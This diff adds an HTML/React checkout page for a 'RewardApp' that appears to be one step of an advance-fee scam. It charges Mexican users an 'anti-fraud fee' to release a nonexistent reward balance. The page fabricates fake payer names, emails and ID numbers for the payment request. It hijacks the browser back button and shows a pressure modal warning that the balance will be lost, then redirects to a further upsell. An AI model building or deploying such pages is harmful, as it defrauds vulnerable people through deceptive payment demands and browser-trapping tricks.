@@ -1,0 +1,503 @@
+﻿<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>RewardApp — Pago SPEI</title>
+  <script>
+    !(function (w, d, t) {
+      w.TiktokAnalyticsObject = t;
+      var ttq = (w[t] = w[t] || []);
+      ttq.methods = ["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+      ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))); }; };
+      for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
+      ttq.instance = function (t) { for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) ttq.setAndDefer(e, ttq.methods[n]); return e; };
+      ttq.load = function (e, n) {
+        var r = "https://analytics.tiktok.com/i18n/pixel/events.js";
+        ttq._i = ttq._i || {}; ttq._i[e] = []; ttq._i[e]._u = r;
+        ttq._t = ttq._t || {}; ttq._t[e] = +new Date();
+        ttq._o = ttq._o || {}; ttq._o[e] = n || {};
+        var a = document.createElement("script"); a.type = "text/javascript"; a.async = true;
+        a.src = r + "?sdkid=" + e + "&lib=" + t;
+        var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(a, s);
+      };
+      ttq.load("D5NU0P3C77U4MKNK7DCG"); ttq.page();
+    })(window, document, "ttq");
+  </script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-V6J3YWY4EN"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){ dataLayer.push(arguments); }
+    gtag('js', new Date()); gtag('config', 'G-V6J3YWY4EN');
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.23.2/babel.min.js"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #000000; }
+    @keyframes float     { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-10px)} }
+    @keyframes bounceIn  { from{opacity:0;transform:scale(0.5)} to{opacity:1;transform:scale(1)} }
+    @keyframes slideUp   { from{opacity:0;transform:translateY(24px)} to{opacity:1;transform:translateY(0)} }
+    @keyframes spin      { to{transform:rotate(360deg)} }
+    @keyframes pulse     { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.55;transform:scale(0.94)} }
+    @keyframes successPop{ 0%{transform:scale(0.3);opacity:0} 60%{transform:scale(1.18);opacity:1} 80%{transform:scale(0.95)} 100%{transform:scale(1)} }
+    @keyframes progressFill { from{width:0%} to{width:100%} }
+    @keyframes shimmer   { 0%{opacity:0.4} 50%{opacity:1} 100%{opacity:0.4} }
+    @keyframes cfall     { from{top:-24px;opacity:1;transform:rotate(0)} to{top:110vh;opacity:0;transform:rotate(700deg)} }
+    ::-webkit-scrollbar { width: 4px; } ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 2px; }
+    #app-outer { padding: 20px; }
+    #app-card  { border-radius: 38px; }
+    @media (max-width: 480px) {
+      #app-outer { padding: 0 !important; align-items: stretch !important; }
+      #app-card  { border-radius: 0 !important; max-width: 100% !important; min-height: 100vh !important; }
+    }
+  </style>
+  <!-- Microsoft Clarity -->
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "wfia3odksk");
+  </script>
+</head>
+<body>
+  <div id="root"></div>
+  <script type="text/babel">
+    const { useState, useEffect, useRef } = React;
+
+    const UTM_FIELDS = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','click_id','fbclid','gclid','msclkid','ttclid'];
+    function getUtmParams() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const fromUrl = {};
+      UTM_FIELDS.forEach(k => { if (urlParams.has(k)) fromUrl[k] = urlParams.get(k); });
+      if (Object.keys(fromUrl).length > 0) { try { localStorage.setItem('utm_params', JSON.stringify(fromUrl)); } catch(e) {} return fromUrl; }
+      try { return JSON.parse(localStorage.getItem('utm_params') || '{}'); } catch(e) { return {}; }
+    }
+    function buildUrlWithUtm(base) {
+      const params = getUtmParams(); const qs = new URLSearchParams(params).toString();
+      return qs ? `${base}?${qs}` : base;
+    }
+
+    function gerarCURP() {
+      let n = ''; for (let i = 0; i < 9; i++) n += Math.floor(Math.random() * 10);
+      let s = 0; for (let i = 0; i < 9; i++) s += parseInt(n[i]) * (10 - i);
+      let r = 11 - (s % 11); n += r > 9 ? 0 : r;
+      s = 0; for (let i = 0; i < 10; i++) s += parseInt(n[i]) * (11 - i);
+      r = 11 - (s % 11); n += r > 9 ? 0 : r; return n;
+    }
+    function gerarNome() {
+      const N = ['Joao','Maria','Pedro','Ana','Carlos','Mariana','Lucas','Juliana','Fernando','Patricia'];
+      const S = ['Silva','Santos','Oliveira','Souza','Rodrigues','Ferreira','Alves','Pereira','Gomes','Martins'];
+      return `${N[~~(Math.random()*N.length)]} ${S[~~(Math.random()*S.length)]} ${S[~~(Math.random()*S.length)]}`;
+    }
+    function gerarEmail(nome) {
+      const P = ['gmail.com','hotmail.com','outlook.com','yahoo.com.br','icloud.com'];
+      return `${nome.toLowerCase().replace(/\s+/g,'.')}@${P[~~(Math.random()*P.length)]}`;
+    }
+    function gerarTelefone() {
+      const D = ['11','21','31','41','51','61','71','81','91'];
+      return `${D[~~(Math.random()*D.length)]}9${Math.floor(10000000+Math.random()*90000000).toString().slice(1)}`;
+    }
+    function getClienteFecha() {
+      let nome = null, email = null, documento = null;
+      try { const s = localStorage.getItem('userSPEIFecha'); if (s) { const d = JSON.parse(s); nome = d.nome || null; if (d.tipoClave === 'CURP' && d.chaveSPEI) documento = d.chaveSPEI.replace(/\D/g,''); } } catch(e) {}
+      if (!nome) nome = gerarNome(); if (!email) email = gerarEmail(nome); if (!documento) documento = gerarCURP();
+      return { nome, email, documento, telefone: gerarTelefone() };
+    }
+
+    const VALOR = 26.9;
+    const VALOR_CENTS = 2690;
+    const ITEM_TITLE = "Tarifa anti-fraude";
+    const CONTENT_ID = "tiktokpay_upsell3";
+    const REDIRECT = "../../upsell4/index.html";
+    function track(ev,d){try{fetch('../../tracker.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:ev,data:d||null})}).catch(()=>{})}catch(_){}}
+
+    async function gerarSPEI() {
+      const cliente = getClienteFecha();
+      const res = await fetch('../../pagz-proxy.php', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ paymentMethod: 'PIX', amount:VALOR_CENTS,
+          customer:{ name:cliente.nome, document:cliente.documento, email:cliente.email },
+          items:[{ title:ITEM_TITLE, quantity:1, unitPrice:VALOR_CENTS }] }),
+      });
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      return res.json();
+    }
+    async function verificarStatus(id) {
+      const res = await fetch(`../../pagz-proxy.php?id=${id}`);
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      return res.json();
+    }
+    function isPaid(data) {
+      const s = (data.status || '').toLowerCase();
+      return data.paid === true || ['completed','paid','approved','confirmado','aprovado','pago'].includes(s);
+    }
+    async function sha256(str) {
+      if (!str) return '';
+      try { const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str.toLowerCase().trim())); return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join(''); } catch(e) { return ''; }
+    }
+
+    const CC = ['#FE2C55','#25F4EE','#25F4EE','#FE2C55','#25F4EE','#34D399','#FE2C55','#25F4EE','#25F4EE'];
+    const pieces = Array.from({ length: 80 }, (_, i) => ({ x:Math.random()*100, delay:Math.random()*1.2, dur:2.5+Math.random()*1.8, c:CC[i%CC.length], w:6+Math.random()*8, round:Math.random()>0.5 }));
+    function Confetti() {
+      return (<div style={{ position:'fixed', inset:0, pointerEvents:'none', overflow:'hidden', zIndex:9999 }}>
+        {pieces.map((p,i) => (<div key={i} style={{ position:'absolute', left:`${p.x}%`, top:-24, width:p.w, height:p.w*0.7, background:p.c, borderRadius:p.round?'50%':3, animation:`cfall ${p.dur}s ${p.delay}s ease-in both` }}/>))}
+      </div>);
+    }
+
+    function QRCodeImg({ code }) {
+      const url = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=10&data=${encodeURIComponent(code)}`;
+      return (<img src={url} alt="QR Code SPEI" style={{ width:220, height:220, borderRadius:16, display:'block' }}
+        onError={e => { e.target.src = `https://quickchart.io/qr?text=${encodeURIComponent(code)}&size=220&margin=2`; }}/>);
+    }
+
+    function useCountdown(expirationDate) {
+      const calc = () => { if (!expirationDate) return 20*60; return Math.max(0, Math.floor((new Date(expirationDate)-Date.now())/1000)); };
+      const [secs, setSecs] = useState(calc);
+      useEffect(() => { const t = setInterval(() => setSecs(calc), 1000); return () => clearInterval(t); }, [expirationDate]);
+      const m = String(Math.floor(secs/60)).padStart(2,'0'); const s = String(secs%60).padStart(2,'0');
+      return { display:`${m}:${s}`, expired:secs===0 };
+    }
+
+    function LoadingScreen() {
+      return (<div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:560, padding:'40px 28px', textAlign:'center' }}>
+        <div style={{ width:72, height:72, borderRadius:'50%', border:'5px solid rgba(255,255,255,0.1)', borderTopColor:'#25F4EE', animation:'spin 0.9s linear infinite', marginBottom:28 }}/>
+        <h2 style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>Generando tu SPEI</h2>
+        <p style={{ color:'rgba(255,255,255,0.65)', fontSize:14, lineHeight:1.65 }}>Preparando código de pago...<br/>Espera um instante.</p>
+        <div style={{ marginTop:28, display:'flex', flexDirection:'column', gap:8, width:'100%', maxWidth:260 }}>
+          {['Conectando al servidor...','Generando código QR...','Casi listo...'].map((txt,i)=>(
+            <div key={i} style={{ display:'flex', alignItems:'center', gap:10, animation:`shimmer 1.8s ${i*0.3}s ease-in-out infinite` }}>
+              <div style={{ width:6, height:6, borderRadius:'50%', background:'#25F4EE', flexShrink:0 }}/>
+              <span style={{ color:'rgba(255,255,255,0.5)', fontSize:12 }}>{txt}</span>
+            </div>
+          ))}
+        </div>
+      </div>);
+    }
+
+    function ErrorScreen({ onRetry }) {
+      return (<div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:560, padding:'40px 28px', textAlign:'center' }}>
+        <div style={{ fontSize:64, marginBottom:20 }}>✨</div>
+        <h2 style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:10 }}>Error al generar SPEI</h2>
+        <p style={{ color:'rgba(255,255,255,0.7)', fontSize:14, lineHeight:1.65, marginBottom:32 }}>No fue posible conectar. Verifica tu conexión e inténtalo de nuevo.</p>
+        <button onClick={onRetry} style={{ background:'linear-gradient(135deg,#25F4EE,#FE2C55)', color:'#0a0a0a', border:'none', borderRadius:22, padding:'15px 40px', fontSize:15, fontWeight:800, cursor:'pointer', boxShadow:'0 8px 24px rgba(254,44,85,0.45)' }} onMouseDown={e=>e.currentTarget.style.transform='scale(0.97)'} onMouseUp={e=>e.currentTarget.style.transform='scale(1)'}>
+          🔄 Intentar de nuevo
+        </button>
+      </div>);
+    }
+
+    function SuccessScreen() {
+      return (<div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:560, padding:'40px 28px', textAlign:'center' }}>
+        <Confetti/>
+        <div style={{ width:96, height:96, borderRadius:'50%', background:'rgba(52,211,153,0.15)', border:'3px solid rgba(52,211,153,0.5)', display:'flex', alignItems:'center', justifyContent:'center', marginBottom:22, animation:'bounceIn 0.5s cubic-bezier(0.34,1.56,0.64,1) both', boxShadow:'0 0 40px rgba(52,211,153,0.25)' }}>
+          <span style={{ fontSize:48, animation:'successPop 0.5s 0.1s cubic-bezier(0.34,1.2,0.64,1) both', display:'inline-block' }}>?</span>
+        </div>
+        <h2 style={{ color:'#34D399', fontSize:24, fontWeight:900, marginBottom:10 }}>¡Pago confirmado!</h2>
+        <p style={{ color:'rgba(255,255,255,0.85)', fontSize:14, lineHeight:1.65, marginBottom:16 }}>Procesando tu solicitud.<br/>Redirigiendo automáticamente...</p>
+        <div style={{ width:'100%', maxWidth:220, height:6, background:'rgba(255,255,255,0.1)', borderRadius:4, overflow:'hidden', margin:'0 auto' }}>
+          <div style={{ height:'100%', borderRadius:4, background:'linear-gradient(90deg,#34D399,#059669)', animation:'progressFill 1.5s linear forwards' }}/>
+        </div>
+        <p style={{ color:'rgba(255,255,255,0.4)', fontSize:12, marginTop:12 }}>Espera...</p>
+      </div>);
+    }
+
+    function SPEIScreen({ SPEICode, amount, expirationDate, txId, onPaid }) {
+      const [copied, setCopied] = useState(false);
+      const [checking, setChecking] = useState(false);
+      const [lastCheck, setLastCheck] = useState('');
+      const intervalRef = useRef(null);
+      const { display: timeLeft, expired } = useCountdown(expirationDate);
+
+      useEffect(() => {
+        if (!txId) return;
+        const poll = () => {
+          verificarStatus(txId).then(data => {
+            setLastCheck(new Date().toLocaleTimeString('es-MX'));
+            if (isPaid(data)) { clearInterval(intervalRef.current); onPaid(txId); }
+          }).catch(() => {});
+        };
+        poll(); intervalRef.current = setInterval(poll, 1500);
+        return () => clearInterval(intervalRef.current);
+      }, [txId]);
+
+      const handleCopy = () => {
+        try { navigator.clipboard.writeText(SPEICode).catch(() => {}); const el = document.createElement('textarea'); el.value = SPEICode; el.style.position='fixed'; el.style.opacity='0'; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el); } catch(e) {}
+        setCopied(true); setTimeout(() => setCopied(false), 2500);
+      };
+      const handleManualCheck = () => {
+        if (!txId || checking) return; setChecking(true);
+        verificarStatus(txId).then(data => { if (isPaid(data)) { clearInterval(intervalRef.current); onPaid(txId); } }).catch(()=>{}).finally(()=>setChecking(false));
+      };
+      const amountFormatted = amount ? amount.toLocaleString('es-MX',{style:'currency',currency:'MXN'}) : `MX$ ${VALOR.toFixed(2).replace('.',',')}`;
+
+      return (<div style={{ padding:'32px 24px 36px', animation:'slideUp 0.4s cubic-bezier(0.34,1.1,0.64,1) both' }}>
+        <div style={{ textAlign:'center', marginBottom:24 }}>
+          <div style={{ display:'inline-flex', alignItems:'center', justifyContent:'center', width:56, height:56, borderRadius:'50%', background:'rgba(52,211,153,0.12)', border:'2px solid rgba(52,211,153,0.35)', marginBottom:12, animation:'float 3s ease-in-out infinite' }}>
+            <span style={{ fontSize:28 }}>✨</span>
+          </div>
+          <h2 style={{ color:'#fff', fontSize:22, fontWeight:900, marginBottom:4 }}>Paga via SPEI</h2>
+          <p style={{ color:'rgba(255,255,255,0.7)', fontSize:13, lineHeight:1.5 }}>Escanea el código QR o copia el código de abajo</p>
+        </div>
+        <div style={{ display:'flex', gap:10, marginBottom:20 }}>
+          <div style={{ flex:1, background:'rgba(0,0,0,0.28)', backdropFilter:'blur(12px)', borderRadius:16, padding:'14px 16px', border:'1px solid rgba(37,244,238,0.25)', textAlign:'center' }}>
+            <div style={{ color:'rgba(255,255,255,0.65)', fontSize:10, fontWeight:700, letterSpacing:1.2, textTransform:'uppercase', marginBottom:4 }}>Valor</div>
+            <div style={{ color:'#25F4EE', fontSize:22, fontWeight:900 }}>{amountFormatted}</div>
+          </div>
+          <div style={{ flex:1, background:'rgba(0,0,0,0.28)', backdropFilter:'blur(12px)', borderRadius:16, padding:'14px 16px', border:`1px solid ${expired?'rgba(248,113,113,0.35)':'rgba(255,255,255,0.15)'}`, textAlign:'center' }}>
+            <div style={{ color:'rgba(255,255,255,0.65)', fontSize:10, fontWeight:700, letterSpacing:1.2, textTransform:'uppercase', marginBottom:4 }}>Expira en</div>
+            <div style={{ fontSize:22, fontWeight:900, color:expired?'#F87171':'#fff', animation:!expired?'pulse 2s ease-in-out infinite':'none' }}>{expired?'✨ Expirado':timeLeft}</div>
+          </div>
+        </div>
+        <div style={{ background:'rgba(0,0,0,0.28)', backdropFilter:'blur(12px)', borderRadius:22, padding:'24px', marginBottom:16, border:'1px solid rgba(255,255,255,0.12)', textAlign:'center' }}>
+          <div style={{ display:'inline-block', padding:12, background:'#fff', borderRadius:14, boxShadow:'0 4px 24px rgba(0,0,0,0.4)' }}>
+            <QRCodeImg code={SPEICode}/>
+          </div>
+          <p style={{ color:'rgba(255,255,255,0.55)', fontSize:12, marginTop:14, lineHeight:1.5 }}>Abre tu banco y escanea el código QR<br/>para pagar con SPEI</p>
+        </div>
+        <div style={{ marginBottom:16 }}>
+          <div style={{ color:'rgba(255,255,255,0.78)', fontSize:12, fontWeight:700, marginBottom:8 }}>O usa SPEI copia y pega:</div>
+          <div style={{ display:'flex', gap:8, alignItems:'stretch', background:'rgba(0,0,0,0.28)', borderRadius:16, border:'1px solid rgba(255,255,255,0.12)', overflow:'hidden' }}>
+            <input readOnly value={SPEICode} style={{ flex:1, background:'none', border:'none', outline:'none', color:'rgba(255,255,255,0.7)', fontSize:11, padding:'13px 14px', fontFamily:'monospace', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}/>
+            <button onClick={handleCopy} style={{ background:copied?'rgba(52,211,153,0.2)':'rgba(37,244,238,0.15)', border:'none', borderLeft:'1px solid rgba(255,255,255,0.1)', padding:'13px 18px', cursor:'pointer', color:copied?'#34D399':'#25F4EE', fontSize:13, fontWeight:800, whiteSpace:'nowrap', transition:'all 0.2s', flexShrink:0 }} onMouseDown={e=>e.currentTarget.style.transform='scale(0.95)'} onMouseUp={e=>e.currentTarget.style.transform='scale(1)'}>
+              {copied?'✓ Copiado!':'✨ Copiar'}
+            </button>
+          </div>
+        </div>
+        <div style={{ background:'rgba(0,0,0,0.22)', borderRadius:14, padding:'12px 16px', border:'1px solid rgba(255,255,255,0.08)', marginBottom:16 }}>
+          <div style={{ display:'flex', alignItems:'center', gap:10 }}>
+            <div style={{ width:10, height:10, borderRadius:'50%', flexShrink:0, background:'#25F4EE', animation:'pulse 1.5s ease-in-out infinite', boxShadow:'0 0 8px rgba(37,244,238,0.6)' }}/>
+            <div style={{ flex:1 }}>
+              <div style={{ color:'#fff', fontSize:13, fontWeight:700 }}>Esperando pago</div>
+              {lastCheck && (<div style={{ color:'rgba(255,255,255,0.45)', fontSize:11, marginTop:2 }}>Última verificacion: {lastCheck}</div>)}
+            </div>
+          </div>
+        </div>
+        <button onClick={handleManualCheck} disabled={checking} style={{ width:'100%', padding:'14px', background:checking?'rgba(255,255,255,0.05)':'rgba(255,255,255,0.08)', border:'1.5px solid rgba(255,255,255,0.18)', borderRadius:18, color:checking?'rgba(255,255,255,0.4)':'rgba(255,255,255,0.9)', fontSize:14, fontWeight:700, cursor:checking?'not-allowed':'pointer', marginBottom:20, transition:'all 0.2s' }} onMouseEnter={e=>{if(!checking)e.currentTarget.style.background='rgba(255,255,255,0.12)'}} onMouseLeave={e=>{if(!checking)e.currentTarget.style.background='rgba(255,255,255,0.08)'}}>
+          {checking?(<span style={{display:'flex',alignItems:'center',justifyContent:'center',gap:8}}><span style={{display:'inline-block',width:14,height:14,border:'2px solid rgba(255,255,255,0.2)',borderTopColor:'#fff',borderRadius:'50%',animation:'spin 0.7s linear infinite'}}/>Verificando...</span>):'✓ Ya pagué — verificar agora'}
+        </button>
+        <div style={{ display:'flex', gap:8, justifyContent:'center' }}>
+          {[['✨','Seguro'],['?','Instantâneo'],['?','Confiável']].map(([ic,lb])=>(
+            <div key={lb} style={{ flex:1, background:'rgba(255,255,255,0.05)', borderRadius:12, padding:'8px 6px', textAlign:'center', border:'1px solid rgba(255,255,255,0.08)' }}>
+              <div style={{ fontSize:14, marginBottom:2 }}>{ic}</div>
+              <div style={{ color:'rgba(255,255,255,0.55)', fontSize:10, fontWeight:600 }}>{lb}</div>
+            </div>
+          ))}
+        </div>
+      </div>);
+    }
+
+    // -- Back-redirect: desconto 50% -----------------------------
+    const VALOR_DESCONTO = Math.round(VALOR * 50) / 100;
+    const CENTS_DESCONTO = Math.floor(VALOR_CENTS / 2);
+
+    async function gerarSPEIDesconto() {
+      const cliente = getClienteFecha();
+      const res = await fetch('../../pagz-proxy.php', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          paymentMethod: 'PIX', amount: CENTS_DESCONTO,
+          customer: { name: cliente.nome, document: cliente.documento, email: cliente.email },
+          items: [{ title: ITEM_TITLE + ' (50% OFF)', quantity: 1, unitPrice: CENTS_DESCONTO }],
+        }),
+      });
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      return res.json();
+    }
+
+    function DiscountModal({ onAccept, onStay }) {
+      const valorFmt  = VALOR.toLocaleString('es-MX', { style:'currency', currency:'MXN' });
+      const descontoFmt = VALOR_DESCONTO.toLocaleString('es-MX', { style:'currency', currency:'MXN' });
+      return (
+        <div style={{
+          position:'fixed', inset:0, zIndex:10000,
+          background:'rgba(0,0,0,0.88)', display:'flex',
+          alignItems:'flex-end', justifyContent:'center',
+          backdropFilter:'blur(10px)',
+        }}>
+          <div style={{
+            background:'linear-gradient(150deg,#050005 0%,#050005 60%,#0a0a0a 100%)',
+            borderRadius:'28px 28px 0 0', padding:'32px 24px 44px',
+            maxWidth:400, width:'100%',
+            border:'1px solid rgba(255,255,255,0.14)',
+            boxShadow:'0 -20px 60px rgba(0,0,0,0.6)',
+            animation:'slideUp 0.35s cubic-bezier(0.34,1.1,0.64,1) both',
+          }}>
+            {/* Ícone */}
+            <div style={{ textAlign:'center', marginBottom:20 }}>
+              <div style={{
+                display:'inline-flex', alignItems:'center', justifyContent:'center',
+                width:64, height:64, borderRadius:'50%',
+                background:'rgba(37,244,238,0.15)', border:'2px solid rgba(37,244,238,0.4)',
+                fontSize:32, marginBottom:12,
+                animation:'bounceIn 0.4s cubic-bezier(0.34,1.56,0.64,1) both',
+              }}>✨</div>
+              <div style={{
+                display:'inline-block', background:'rgba(248,113,113,0.15)',
+                border:'1px solid rgba(248,113,113,0.4)', borderRadius:20,
+                padding:'4px 14px', color:'#F87171', fontSize:11, fontWeight:800,
+                letterSpacing:0.5, marginBottom:10,
+              }}>⚠️ ÚLTIMA CHANCE</div>
+              <h2 style={{ color:'#fff', fontSize:22, fontWeight:900, margin:'0 0 8px', letterSpacing:-0.5 }}>
+                ¡Atención! Proceso incompleto
+              </h2>
+              <p style={{ color:'rgba(255,255,255,0.75)', fontSize:13, lineHeight:1.6, margin:0 }}>
+                Si sales ahora, <strong style={{color:'#25F4EE'}}>tu saldo no será transferido</strong> por no completar el proceso de retiro. Finaliza con 50% de descuento.
+              </p>
+            </div>
+
+            {/* Precio con descuento */}
+            <div style={{
+              background:'rgba(0,0,0,0.3)', borderRadius:20, padding:'20px',
+              border:'1px solid rgba(37,244,238,0.25)', marginBottom:20, textAlign:'center',
+            }}>
+              <div style={{ color:'rgba(255,255,255,0.5)', fontSize:12, marginBottom:6 }}>
+                De <span style={{ textDecoration:'line-through', color:'rgba(248,113,113,0.8)' }}>{valorFmt}</span>
+              </div>
+              <div style={{
+                color:'#25F4EE', fontSize:42, fontWeight:900, lineHeight:1,
+                textShadow:'0 0 24px rgba(37,244,238,0.5)',
+              }}>{descontoFmt}</div>
+              <div style={{
+                display:'inline-block', background:'rgba(52,211,153,0.15)',
+                border:'1px solid rgba(52,211,153,0.4)', borderRadius:20,
+                padding:'4px 14px', color:'#34D399', fontSize:12, fontWeight:800, marginTop:8,
+              }}>🔥 50% DE DESCONTO</div>
+              <p style={{ color:'rgba(255,255,255,0.6)', fontSize:11, marginTop:10, lineHeight:1.5 }}>
+                Completa ahora con descuento para garantizar<br/>la liberación de tu saldo.
+              </p>
+            </div>
+
+            {/* Botões */}
+            <button
+              onClick={onAccept}
+              style={{
+                width:'100%', padding:'16px', border:'none', borderRadius:22,
+                background:'linear-gradient(135deg,#25F4EE,#FE2C55)', color:'#0a0a0a',
+                fontSize:16, fontWeight:800, cursor:'pointer', marginBottom:10,
+                boxShadow:'0 8px 24px rgba(254,44,85,0.45)', transition:'all 0.2s',
+              }}
+              onMouseDown={e=>e.currentTarget.style.transform='scale(0.97)'}
+              onMouseUp={e=>e.currentTarget.style.transform='scale(1)'}
+            >
+              💸 Aceptar descuento y pagar {descontoFmt}
+            </button>
+            <button
+              onClick={onStay}
+              style={{
+                width:'100%', padding:'13px', background:'transparent',
+                border:'1.5px solid rgba(255,255,255,0.18)', borderRadius:20,
+                color:'rgba(255,255,255,0.5)', fontSize:13, fontWeight:600,
+                cursor:'pointer', transition:'all 0.2s',
+              }}
+            >
+              No, prefiero pagar el valor completo
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    function App() {
+      const [phase, setPhase] = useState('loading');
+
+      const [showDiscount, setShowDiscount] = useState(false);
+      const [discountAccepted, setDiscountAccepted] = useState(false);
+
+      const [SPEICode, setSPEICode] = useState('');
+      const [txId, setTxId] = useState(null);
+      const [amount, setAmount] = useState(null);
+      const [expDate, setExpDate] = useState(null);
+
+      const load = () => {
+        setPhase('loading'); getUtmParams();
+        gerarSPEI().then(data => {
+          const code = (data?.SPEI?.qrcode || data?.pix?.qrcode) || '';
+          if (!code) { setPhase('error'); return; }
+          setSPEICode(code); setTxId(data.id || null);
+          setAmount(data.amount ? data.amount/100 : VALOR);
+          if ((data.SPEI || data.pix)?.expirationDate) setExpDate((data.SPEI || data.pix).expirationDate);
+          if (window.ttq) window.ttq.track('InitiateCheckout', { content_id:CONTENT_ID, content_type:'product', content_name:ITEM_TITLE, currency:'MXN', value:VALOR });
+          track('upsell_3_pago_view');
+          setPhase('SPEI');
+        }).catch(() => setPhase('error'));
+      };
+
+        // Back-redirect trap
+        useEffect(() => {
+          history.pushState({ trapped: true }, '');
+          const handlePop = () => {
+            history.pushState({ trapped: true }, '');
+            if (!showDiscount && !discountAccepted) setShowDiscount(true);
+          };
+          window.addEventListener('popstate', handlePop);
+          return () => window.removeEventListener('popstate', handlePop);
+        }, [showDiscount, discountAccepted]);
+
+        const handleDiscountAccept = () => {
+          setShowDiscount(false);
+          setDiscountAccepted(true);
+          setPhase('loading');
+          getUtmParams();
+          gerarSPEIDesconto().then(data => {
+            const code = (data?.SPEI?.qrcode || data?.pix?.qrcode) || '';
+            if (!code) { setPhase('error'); return; }
+            setSPEICode(code); setTxId(data.id || null);
+            setAmount(data.amount ? data.amount/100 : VALOR_DESCONTO);
+            if ((data.SPEI || data.pix)?.expirationDate) setExpDate((data.SPEI || data.pix).expirationDate);
+            setPhase('SPEI');
+          }).catch(() => setPhase('error'));
+        };
+
+        const handleDiscountStay = () => {
+          setShowDiscount(false);
+        };
+
+      useEffect(() => { load(); }, []);
+
+      const handlePaid = async (id) => {
+        setPhase('success');
+        const cliente = getClienteFecha();
+        const [hashEmail, hashPhone] = await Promise.all([sha256(cliente.email), sha256(cliente.documento)]);
+        if (window.ttq) {
+          window.ttq.identify({ external_id:hashPhone, email:hashEmail, phone_number:hashPhone });
+          window.ttq.track('Purchase', { content_id:CONTENT_ID, content_type:'product', content_name:ITEM_TITLE, currency:'MXN', value:VALOR });
+        }
+        track('upsell_3_pago');
+        window.location.href = buildUrlWithUtm(REDIRECT);
+      };
+
+      return (
+        <div id="app-outer" style={{ minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center', background:'radial-gradient(ellipse at 50% 0%,#050005 0%,#000000 70%)', fontFamily:'-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif' }}>
+          <div id="app-card" style={{ width:'100%', maxWidth:400, overflow:'hidden', position:'relative', boxShadow:'0 50px 110px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,255,255,0.07)', background:'linear-gradient(150deg,#050005 0%,#050005 55%,#0a0a0a 100%)' }}>
+            <div style={{ padding:'20px 24px 0', display:'flex', alignItems:'center', gap:12 }}>
+              <div style={{ width:36, height:36, borderRadius:'50%', background:'rgba(255,255,255,0.08)', border:'1px solid rgba(255,255,255,0.15)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:18 }}>✨</div>
+              <div>
+                <div style={{ color:'#fff', fontWeight:800, fontSize:14, lineHeight:1 }}>RewardApp</div>
+                <div style={{ color:'rgba(255,255,255,0.5)', fontSize:11 }}>Pago seguro</div>
+              </div>
+              <div style={{ marginLeft:'auto', background:'rgba(52,211,153,0.12)', border:'1px solid rgba(52,211,153,0.3)', borderRadius:20, padding:'4px 12px', color:'#34D399', fontSize:11, fontWeight:700 }}>🔒 SSL</div>
+            </div>
+            {phase === 'loading' && <LoadingScreen/>}
+            {phase === 'error'   && <ErrorScreen onRetry={load}/>}
+            {phase === 'success' && <SuccessScreen/>}
+            {phase === 'SPEI'     && <SPEIScreen SPEICode={SPEICode} amount={amount} expirationDate={expDate} txId={txId} onPaid={handlePaid}/>}
+            <div style={{ display:'flex', justifyContent:'center', gap:6, paddingBottom:20, paddingTop:4, pointerEvents:'none' }}>
+              {[0,1,2,3].map(i=>(<div key={i} style={{ width:i===3?22:6, height:6, borderRadius:3, background:i===3?'rgba(255,255,255,0.92)':'rgba(255,255,255,0.22)' }}/>))}
+            </div>
+          </div>
+          {showDiscount && (
+            <DiscountModal
+              onAccept={handleDiscountAccept}
+              onStay={handleDiscountStay}
+            />
+          )}
+        </div>
+      );
+    }
+    ReactDOM.createRoot(document.getElementById('root')).render(<App/>);
+  </script>
+</body>
+</html>
